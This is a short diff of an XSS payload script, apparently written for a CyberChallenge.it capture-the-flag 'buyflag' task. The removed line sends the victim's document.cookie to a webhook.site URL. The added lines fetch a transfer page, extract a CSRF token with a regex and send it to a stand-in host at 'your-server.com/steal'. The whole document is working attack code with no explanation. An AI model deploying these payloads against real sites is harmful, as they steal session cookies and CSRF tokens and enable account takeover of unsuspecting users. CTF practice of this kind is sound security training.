@@ -1,3 +1,8 @@
 <script>
-location='https://webhook.site/267edce3-ff3a-4915-a47c-2357201462b0?cookie='+document.cookie;
+fetch('http://buyflag.challs.cyberchallenge.it/transfer.php')
+  .then(response => response.text())
+  .then(data => {
+    var csrfToken = data.match(/csrf_token_([^"]+)/)[1];
+    fetch('http://your-server.com/steal?token=' + csrfToken);
+  });
 </script>
